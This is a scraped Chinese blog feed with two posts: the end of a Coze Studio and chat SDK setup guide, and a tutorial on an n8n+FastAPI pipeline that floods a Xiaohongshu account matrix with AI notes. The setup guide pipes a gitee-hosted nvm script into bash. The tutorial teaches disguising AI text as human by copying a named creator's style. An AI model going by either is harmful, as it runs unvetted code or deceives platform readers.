      <span class="hljs-attr">icon</span>: <span class="hljs-string">'https://lf-coze-web-cdn.coze.cn/obj/eden-cn/lm-lgvj/ljhwZthlaukjlkulzlp/coze/chatsdk-logo.png'</span>,
      <span class="hljs-attr">layout</span>: <span class="hljs-string">'pc'</span>,
      <span class="hljs-attr">lang</span>: <span class="hljs-string">'en'</span>,
      <span class="hljs-attr">zIndex</span>: <span class="hljs-number">1000</span>
    },
    <span class="hljs-comment">/**
    * Controls whether to display the top title bar and the close button
    * @param header.isShow - Whether to display the top title bar.
    * @param header.isNeedClose - Whether to display the close button.
    */</span>
    <span class="hljs-attr">header</span>: {
      <span class="hljs-attr">isShow</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">isNeedClose</span>: <span class="hljs-literal">true</span>,
    },
    <span class="hljs-comment">/**
    * Controls whether to display the floating ball at the bottom right corner of the page.
    */</span>
    <span class="hljs-attr">asstBtn</span>: {
      <span class="hljs-attr">isNeed</span>: <span class="hljs-literal">true</span>
    },
    <span class="hljs-comment">/**
    * The ui.footer parameter is used to add the footer of the chat window.
    * @param footer.isShow - Whether to display the bottom copy module.
    * @param footer.expressionText - The text information displayed at the bottom.
    * @param footer.linkvars - The link copy and link address in the footer.
    */</span>
    <span class="hljs-attr">footer</span>: {
      <span class="hljs-attr">isShow</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">expressionText</span>: <span class="hljs-string">'Powered by ...'</span>,
    },
    <span class="hljs-comment">/**
    * Control the UI and basic capabilities of the chat box.
    * @param chatBot.title - The title of the chatbox
    * @param chatBot.uploadable - Whether file uploading is supported.
    * @param chatBot.width - The width of the agent window on PC is measured in px, default is 460.
    * @param chatBot.el - Container for setting the placement of the chat box (Element).
    */</span>
    <span class="hljs-attr">chatBot</span>: {
      <span class="hljs-attr">title</span>: <span class="hljs-string">'Coze Bot'</span>,
      <span class="hljs-attr">uploadable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">width</span>: <span class="hljs-number">390</span>,
    },
  },
});
</code></pre>
<h2 data-id="heading-2">开发环境</h2>
<p><strong>环境要求</strong>： docker、go（≥1.24）、make、node(&gt;=22) 、npm、rush</p>
<h3 data-id="heading-3">安装nvm和node22+</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 0.  安装nvm</span>
curl -fsSL https://gitee.com/edazh/nvm/raw/master/install.sh | bash

<span class="hljs-comment"># 1. 先删除可能冲突的镜像配置（若之前加过其他镜像）</span>
sed -i <span class="hljs-string">'/NVM_NODEJS_ORG_MIRROR/d'</span> ~/.bashrc

<span class="hljs-comment"># 2. 重新添加淘宝镜像（更稳定，支持版本查询）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">'export NVM_NODEJS_ORG_MIRROR=https://mirrors.aliyun.com/nodejs-release/'</span> &gt;&gt; ~/.bashrc

<span class="hljs-comment"># 3. 激活配置（必须执行，让镜像生效）</span>
<span class="hljs-built_in">source</span> ~/.bashrc

<span class="hljs-comment"># 4. 安装22的最新版</span>
nvm install 22
</code></pre>
<h3 data-id="heading-4">下载coze-studio源码</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 下载源码</span>
git <span class="hljs-built_in">clone</span> https://github.com/coze-dev/coze-studio.git

<span class="hljs-comment"># 安装环境</span>
npm install -g pnpm rush

<span class="hljs-comment"># 安装docker</span>
yum makecache
yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
yum install -y gcc gcc-c++ make yum-utils device-mapper-persistent-data lvm2
yum install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
systemctl <span class="hljs-built_in">enable</span> docker
systemctl start docker

<span class="hljs-comment"># 安装golang最新版，我安了是 1.24.6</span>
dnf install -y epel-release
dnf install -y golang
go version
</code></pre>
<h3 data-id="heading-5">调试步骤</h3>
<ol>
<li>
<p>首次在本地启动调试时，需要执行以下命令：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 确保 docker 是正常运行的</span>
make debug
</code></pre>
</li>
<li>
<p>后面修改代码保存，直接重新编译启动coze-server服务，执行以下命令即可：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-built_in">make</span> server
</code></pre>
</li>
<li>
<p>除上述外，如果还需要调试前端代码，重新打开Terminal 程序，启动前端工程：</p>
<pre><code class="hljs language-bash" lang="bash">bash scripts/setup_fe.sh
<span class="hljs-built_in">cd</span> frontend/apps/coze-studio
npm run dev
</code></pre>
</li>
</ol>
<h3 data-id="heading-6">发布私有化Chat Sdk页面</h3>
<p>安装图上修改源码服务器地址，重新build chat sdk代码</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff12965b2a7c4165af22bb70f986b9f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Liq5LiN5Lya6YeN5aSN55qEaWQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300796&amp;x-signature=icHs8W7479M83AWGg2msIBrYjT0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">效果</h3>
<p>样式有问题，错位了，自己在 index.html中手动增加点样式吧</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.semi-avatar-circle</span> {
        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;
    }
    <span class="hljs-selector-class">.semi-avatar-small</span> {
        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">3px</span>;
        <span class="hljs-attribute">width</span>: <span class="hljs-number">32px</span>;
        <span class="hljs-attribute">height</span>: <span class="hljs-number">32px</span>;
    }
    
    <span class="hljs-selector-class">.semi-avatar</span> {
        <span class="hljs-attribute">white-space</span>: nowrap;
        <span class="hljs-attribute">text-align</span>: center;
        <span class="hljs-attribute">vertical-align</span>: middle;
        <span class="hljs-attribute">justify-content</span>: center;
        <span class="hljs-attribute">align-items</span>: center;
        <span class="hljs-attribute">display</span>: inline-flex;
        <span class="hljs-attribute">position</span>: relative;
        <span class="hljs-attribute">overflow</span>: hidden;
    }
    <span class="hljs-selector-class">.semi-avatar</span>&gt;<span class="hljs-selector-tag">img</span> {
        -o-<span class="hljs-attribute">object-fit</span>: cover;
        <span class="hljs-attribute">object-fit</span>: cover;
        <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
        <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
        <span class="hljs-attribute">display</span>: block;
    }
    <span class="hljs-selector-class">.semi-upload-hidden-input</span>, <span class="hljs-selector-class">.semi-upload-hidden-input-replace</span> {
        <span class="hljs-attribute">display</span>: none;
    }
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c71e63b2a8104324a4263793580fd5ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Liq5LiN5Lya6YeN5aSN55qEaWQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300796&amp;x-signature=MpVdjUpfU49GeHYL5phiNbi8T%2Bw%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[n8n+FastAPI=王炸！免费开源我年入7位数的小红书AI矩阵工作流]]></title>    <link>https://juejin.cn/post/7574651025728077862</link>    <guid>https://juejin.cn/post/7574651025728077862</guid>    <pubDate>2025-11-20T15:07:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574651025728077862" data-draft-id="7574677905500356634" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="n8n+FastAPI=王炸！免费开源我年入7位数的小红书AI矩阵工作流"/> <meta itemprop="keywords" content="OpenAI,AI编程,人工智能"/> <meta itemprop="datePublished" content="2025-11-20T15:07:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="饼干哥哥"/> <meta itemprop="url" content="https://juejin.cn/user/2001569972490973"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            n8n+FastAPI=王炸！免费开源我年入7位数的小红书AI矩阵工作流
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2001569972490973/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    饼干哥哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-20T15:07:13.000Z" title="Thu Nov 20 2025 15:07:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>n8n绝对是小公司和个人工作室做<strong>AI自动化</strong>的最佳神器</p>
<p>再加上<strong>后端用AI编程写脚本，封装成FastAPI给n8n用，可以无限扩展边界，效率拉满</strong></p>
<p>而且n8n开源自用成本极低，买个服务器几百元一年，就能7*24小时定时干活。</p>
<p>如果你还没试过，不妨看下饼干哥哥在内容创作中的应用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2135b5eaf6c4e9f96c95da87d7b4142~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=AH0Sc4pDxTNwJn1bP0wyk%2BnM1vY%3D" alt="" loading="lazy"/></p>
<p>饼干哥哥刚 AI 创业的时候，做小红书，每天想到头秃出来几个选题，用力一做，结果小眼睛不过百。</p>
<p>同样的内容，换个账号，换个时间段发，数据就完全不一样了，也就是说流量受账号权重、平台政策的影响太大了。</p>
<p>面对这样的情况，有两种解决方案：</p>
<p>1是花更多时间心思去做精品内容，适合做个人IP，后期接商单</p>
<p><strong>2是做多个70分的帐号矩阵，用数量去对抗平台流量的不确定性</strong></p>
<p>因为我做的项目都是引流到私域再转化为主，所以选择的是后者。</p>
<p>之前我分享的<strong>用 vibe marketing 一年 gmv7 位数的复盘</strong>就是基于这个逻辑：</p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FWamLHTylkanbxmgiWdI3Kg" target="_blank" title="https://mp.weixin.qq.com/s/WamLHTylkanbxmgiWdI3Kg" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/WamLHTylk…</a></strong></p>
<p>而矩阵的背后我用的是 n8n + FastAPI来驱动。</p>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><strong>为什么是 n8n？</strong></p>
<p>我最开始是用 Cursor 开发了一个内容管理程序，从读内容、AI 写作、多账号管理等等一应俱全，前后耗时 1 个月。</p>
<p>做出来的时候自我感觉非常良好，一个全自动的流程，甚至可以打包出来作为解决方案卖给同行，美滋滋。</p>
<p>但一夜暴富的结局还没来，我就累了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bfdb1ee0660e47c29983c2d6b7b201bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=fADzKt%2FztcEfN5%2F%2FtvL2PpluWnA%3D" alt="" loading="lazy"/></p>
<p>这程序开发耗时这么久是因为每次加功能都是要从0 开始写，还要注意不能影响其他功能模块，AI编程不确定性强，常常要熬夜来搞；</p>
<p>而且在给团队其他人用的时候，还有环境问题，操作流程还很复杂，特别累</p>
<p>突然有次，用 n8n 做案例的时候，晃过神来，这个逻辑是不是用 n8n 来实现？<br/>
<strong>结果我花了一周时间就复现了，而且更加灵活，且拓展性非常高我这个做成了小红书的模板，我只需要通过简单的修改，完全可以适配到其他的平台，比如Reddit，甚至公众号也可以共享其中的一些节点的逻辑</strong></p>
<p>加上n8n 和程序其实是两套不同的逻辑，前者是更加高度自动化的流程，从设计上，我不用写一大堆说明流程给其他使用的人，基本上都是一键解决，甚至是定时运行即可。</p>
<p><strong>虽然自己革了自己的命（原先的程序彻底报废了），但走在正确道路上的感觉爽爆了，整体效率起码又翻了一倍。</strong></p>
<p>接下来我给大家仔细拆解我在实践业务中落地的n8n工作流是长什么样的</p>
<p>以暑假课引流的项目为例，分为4个部分：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac5b9e4489bf4e5188e07b2356407be0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=F3al3B%2BLF6oy4rIq3K6n7uT6TGo%3D" alt="" loading="lazy"/></p>
<p><strong>1. 定时触发、多角度生成选题</strong></p>
<p>好的选题，就已经决定了一半的流量。所以这个工作流想要有效果，起点就是能源源不断的产生能带来流量、甚至直接跟「转化」相关的选题</p>
<p><strong>2. 逐个生成笔记内容，包括标题、正文</strong></p>
<p>这个比较好理解，直接用AI根据选题来生成就好了，没什么难度</p>
<p><strong>3. 后端Python把Markdown转成备忘录图片</strong></p>
<p>当时我用的是Cursor开发了一个脚本，调用playwright自动化框架去md2card，把内容转成备忘录的图片</p>
<p>然后把脚本封装成fastapi，提供接口给n8n调用</p>
<p><strong>要说整个流程的难点，或许就在这里，怎么解决图片生成的问题，接下来会重点讲。</strong></p>
<p><strong>4. 笔记内容和图片上传飞书</strong></p>
<p>最后这里就是数据存储了，顺便还把内容同步一份到了公众号矩阵的库里，一鱼两吃美滋滋。</p>
<p>唯一的卡点在多张图如何放到一个单元格里，这也就是个经验值，但不懂的时候也是花了好多个小时摸索的</p>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><strong>实践案例</strong></p>
<p><strong>这个项目非常完整，从n8n的工作流搭建、到外部接口的开发、到存数据的飞书，跑完后，将打通自动化流程的任督二脉。</strong></p>
<p>接下来我们逐个部分来看。</p>






<table><thead><tr><th>但注意，这不是一个0基础入门课，我会讲核心的逻辑和卡点部分n8n的基础需要你先自行学习。此外，<strong>文末会附工作流的落地实践建议。</strong></th></tr></thead></table>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1. <strong>定时触发、多角度生成选题</strong></p>
<p>如图，通过定时任务触发器，每天自动运行</p>
<p><strong>第一步是通过AI生成选题，这步是关键，待会细说</strong></p>
<p>接着把AI生成的多个选题通过Split out拆成一个一个的项</p>
<p>最后通过Merge把所有的项都<strong>合并成一个数组用于下一个阶段的运行。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2047c2c19b154b518248c5dca83f65c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=%2F49zKlTUIkfEOMmGLBMxSRE5iqU%3D" alt="" loading="lazy"/></p>
<p>OK，这里重点讲一下选题是怎么来的。</p>
<p>如图，核心是下面的System Mesage里面是我用AI生成的选题建议</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df19cc9055f54124aa2fb6cfa61a01a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=0gl4QOpZOJ8cpK0WIHuZ42GCCh4%3D" alt="" loading="lazy"/></p>
<p>整体很长，我就只放一部分作为模板：</p>






<table><thead><tr><th>Markdown # 广州暑假学习爆款文章标题与选题全面分析  ## 广州暑假学习类爆款文章主题集中在以下几个核心领域：  ### 1. 暑期提分与学霸养成路径 此类文章着重强调学生通过暑假规划实现成绩突破，特点是“精准策略、弯道超车、高效提分”。  <strong>代表文章：</strong> - 《广州八升九暑假怎么过？》（含提分策略） - 《八升九：做好暑假规划，开学就是爆发🔥》（含规划） - 《广州八升九暑期规划，开学逆袭！！》 - 《广州，孩子的起跑点其实是初二暑假》（强调关键期逆袭）  <strong>核心卖点：</strong> 精准提分、弯道超车、学霸养成、赢在中高考起跑线、告别低效  ### 2. 打破低效学习，暑期高效进阶 (方法论) ...  ## 爆款文章标题创作公式 (针对暑假学习)  ### 基础公式结构  爆款标题 = [<strong>目标群体/升学阶段</strong>] + [<strong>核心痛点/期望</strong> (常含“暑假”)] + [<strong>解决方案/价值承诺</strong> (常含“规划/如何/方法”)] + (可选: [<strong>地域标签/强调词/数字</strong>])  ### 20个爆款标题创作模板 (针对暑假学习，结合原文风格)  1. <strong>[地域][年级分水岭]型 + 紧迫感</strong> 2. <strong>[年级]+[学科]暑假“怎么办/如何”型 + 痛点/期望</strong> 3. <strong>“过来人/学霸/名师”经验型 + [学科] + [暑假规划/秘籍]</strong></th></tr></thead></table>
<p>可以看出来它又两部分组成：<strong>5大选题类型➕20个爆款标题创作模板。</strong></p>
<p>有了它们基本上就是源源不断的生产新内容。</p>
<p>它们是怎么来的呢？</p>
<p>是我用搭了一个RPA，输入关键词后，把点赞超过300的笔记都抓下来，放到飞书里。</p>
<p>你也可以用其他现成的工具，例如江湖工具箱。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f5fbfbd5d884dfba75a92c92cf8f5cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=gq9vyTW7N4Gcj0hU7Lgbx5vXHVM%3D" alt="" loading="lazy"/></p>
<p>然后把所有标题都扔给AI，让它按我前面给的模板形式去总结就好了</p>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2. <strong>逐个生成笔记内容，包括标题、正文</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20bbc6b821d54de19cdec32577c22ffe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=W831aAaPbWr4NPdCfS%2BKW5Y4j1A%3D" alt="" loading="lazy"/></p>
<p>接入前面的标题数组后，用Loop Over items来逐个处理</p>
<p>首先<strong>根据标题生成Markdown正文，用于生成备忘录图文，这个是笔记内容的核心，取决于是否有流量、有转化的核心，待会单独讲。</strong></p>
<p>最后生成小于20字的短标题、小于1000字的纯文本正文内容，这些是小红书笔记的要求。</p>
<p>接下来我们核心看生成正文的节点：</p>
<p>可以看到有两个部分组成，上面解决的是AI幻觉的问题，下面解决的是AI写作的问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34f3a140af9d440f9f592e1936fb8b2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=DwVXP3wUi58euce4im6rjhAWNAo%3D" alt="" loading="lazy"/></p>
<p><strong>纯AI写内容会有很大幻觉。</strong></p>
<p>例如我们写高中英语的内容，AI并不知道高中的范围是什么，可能给出超纲的大学英语、也可能给出过于简单的小学英语</p>
<p>想解决这个问题就要接「知识库」</p>
<p>可以用秘塔等AI搜索工具，把某个领域的知识收集整理好；同时也把收集到的资料，甚至是教科书都扔到知识库里</p>
<p>为了确保效果，这里我外接了fastgpt，具体教程可以看： <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FCLcr8aY-G03xGES4Nl3GCA" target="_blank" title="https://mp.weixin.qq.com/s/CLcr8aY-G03xGES4Nl3GCA" ref="nofollow noopener noreferrer">n8n+fastgpt RAG = 王炸！！！用最强AI知识库MCP Server补全 n8n短板</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a722094b7cfe4696881d4c1d4db6c144~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=BoC9Gq5m77K5IcwTqaiQscoWZhk%3D" alt="" loading="lazy"/></p>
<p><strong>AI写小红书笔记的问题在于怎么让人看不出来是AI写的</strong></p>
<p><strong>关键在于，生成独家的写作风格</strong></p>
<p>例如以下是把大神卡兹克的多篇爆款文章扔给AI总结后形成的写作风格，感兴趣可以试下，让AI按这个风格写，能有多像卡兹克呢</p>






<table><thead><tr><th>Markdown 写作风格 轻松活泼、口语化的表达，富有亲和力 大量使用感叹号、省略号增强情感表达 直接表达个人观点和态度，有明确立场 适当使用网络热词和流行语("人已麻"、"这波操作"等) 运用生动形象的比喻和修辞手法结构清晰，善用强调(加粗文字)突出重点 带有幽默感的叙述方式，时而自嘲  主题倾向 AI产品和技术评测，尤其关注中文AI技术发展 分享AI工具使用体验和操作技巧探讨 AI技术对行业和社会的影响 提供实际操作演示和案例 分析关注AI技术的实用性和易用性  目标受众 AI爱好者和技术追随者 设计师、创意工作者和内容创作者 对新技术感兴趣但不一定有专业背景的普通用户 寻找提升工作效率工具的专业人士 对AI前沿发展保持关注的读者群  格式要求 标题引人注目，带有情感色彩和悬念感 文章开头通常用个人经历或故事引入主题 大量使用实际案例和截图增强说服力 结构分明，善用小标题和加粗文字分段 结尾常有个人思考或对行业发展的展望 固定的结语格式，鼓励读者互动和分享  注意，我的名字是“XXX”，风格偏向于轻松幽默，易读。</th></tr></thead></table>
<p>话说回来，我们可以用第一步抓取到的小红书笔记正文，挑几篇爆款的笔记，让AI按以上的模板来总结写作风格。</p>
<p>这样出来的内容大概率就没有AI味了，而且还是<strong>垂直赛道的风格</strong></p>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3. <strong>后端Python把Markdown转成备忘录图片</strong></p>
<p>这一步，前面说是整个流程的难点大Boss，也是很多同学卡住的地方。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2594ba37433494e9cbd63e32438bb17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764256033&amp;x-signature=C316FDW07Z6DaLy6Xg9oecsDqMY%3D" alt="" loading="lazy"/></p>
<p>在n8n流程里<strong>自动</strong>做小红书封面图片，有两种方式，我都在用：</p>
<p>1是让AI生成HTML图，然后转成图片</p>
<p>2是用第三方工具，输入标题内容后生成图片</p>
<p>前者的问题在于AI生成的HTML不确定很高，最好的方式就是先跑出几个模板，然后固定下来，一个选题用一个HTML模板，在给AI得提示词里就直接把模板代码塞进去，让AI根据新的内容生成新的HTML即可。</p>
<p>后者，也是今天这流程的方案</p>
<p>先找到一个可以自动生成多张3:4图片的工具，例如我用MD2CARD</p>
<p>然后手动去跑一遍，记录下所有操作：</p>
